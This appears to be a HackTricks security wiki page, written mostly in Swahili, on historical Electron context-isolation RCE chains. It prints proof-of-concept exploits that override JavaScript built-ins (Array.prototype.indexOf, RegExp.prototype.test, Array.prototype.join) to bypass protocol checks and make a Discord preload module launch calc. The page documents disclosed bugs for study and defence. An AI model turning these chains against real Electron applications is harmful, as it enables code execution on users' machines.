# Electron contextIsolation RCE via preload code

{{#include ../../banners/hacktricks-training.md}}

Hizi ni **historical chains** ambapo preload code ilishiriki JavaScript intrinsics au privileged APIs na maudhui ya renderer yanayodhibitiwa na mshambulizi. Context isolation ikiwa imewashwa, preload na page kwa kawaida huwa katika JavaScript realms tofauti, kwa hivyo kubadilisha prototypes kwenye page hakuathiri moja kwa moja preload objects. Hakiki chain kulingana na toleo halisi la Electron/application na bridge implementation.<sup>[[3]](#references)</sup>

## Mfano wa 1

Mfano kutoka [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Code hii hufungua links za http(s) kwa kutumia browser chaguomsingi:

![Electron contextIsolation RCE via preload code - Example 1: This code open http(s) links with default browser](<../../images/image (768).png>)

Katika application ya zamani iliyoathiriwa, navigation ya local-file kama `file:///C:/Windows/System32/calc.exe` ingeweza kufikia njia ya kuzindua OS; `SAFE_PROTOCOLS.indexOf` ilikusudiwa kuzuia hilo.

Kwa hivyo, mshambulizi angeweza kuingiza JS code hii kupitia XSS au arbitrary page navigation:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Kwa kuwa mwito wa `SAFE_PROTOCOLS.indexOf` utarudisha 1337 kila mara, mshambuliaji anaweza kukwepa ulinzi na kutekeleza calc. Exploit ya mwisho:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Angalia slaidi asili kwa njia nyingine za kutekeleza programu bila kuombwa ruhusa.<sup>[[1]](#references)</sup>

Mnyororo wa kihistoria wa Discord pia ulizingatia upakiaji wa `file://127.0.0.1/electron/rce.jar` wa mtindo wa UNC kama njia nyingine inayoweza kutumika ya kutekeleza programu; hakiki kama inafikika kwenye build halisi ya Windows/Electron.<sup>[[2]](#references)</sup>

## Mfano wa 2: Discord App RCE

Mfano kutoka [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Nilipokagua scripts za preload, niligundua kuwa Discord hufichua function inayoruhusu baadhi ya modules zilizoidhinishwa kuitwa kupitia `DiscordNative.nativeModules.requireModule('MODULE-NAME')` kwenye ukurasa wa wavuti.\
Hapa, sikuweza kutumia modules zinazoweza kutumiwa moja kwa moja kwa RCE, kama vile module ya _child_process_, lakini **nilipata code inayowezesha RCE kwa kubatilisha methods zilizojengewa ndani za JavaScript** na kuingilia utekelezaji wa module iliyofichuliwa.

Ifuatayo ni PoC. Niliweza kuthibitisha kuwa programu ya **calc** **hufunguka** ninapo**ita function ya `getGPUDriverVersions` iliyofafanuliwa kwenye module inayoitwa "_discord_utils_" kutoka devTools**, huku **nikibatilisha `RegExp.prototype.test` na `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

Kazi ya `getGPUDriverVersions` hujaribu kutekeleza programu kwa kutumia maktaba ya "_execa_", kama ifuatavyo:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Kwa kawaida, _execa_ hujaribu kutekeleza "_nvidia-smi.exe_", ambayo imebainishwa katika kigezo cha `nvidiaSmiPath`. Hata hivyo, kutokana na `RegExp.prototype.test` na `Array.prototype.join` kubadilishwa, **argument inabadilishwa kuwa "**_**calc**_**" wakati wa uchakataji wa ndani wa _execa**_**.

Hasa, argument inabadilishwa kwa kuathiri njia za utatuzi wa amri na uchakataji wa arguments katika parser ya kihistoria ya `cross-spawn`.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Kutumia vibaya ukosefu wa utenganishaji wa muktadha - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [Discord Desktop app RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Utenganishaji wa muktadha](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn` marekebisho ya parser na njia halisi zilizotumiwa na mnyororo (mistari 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
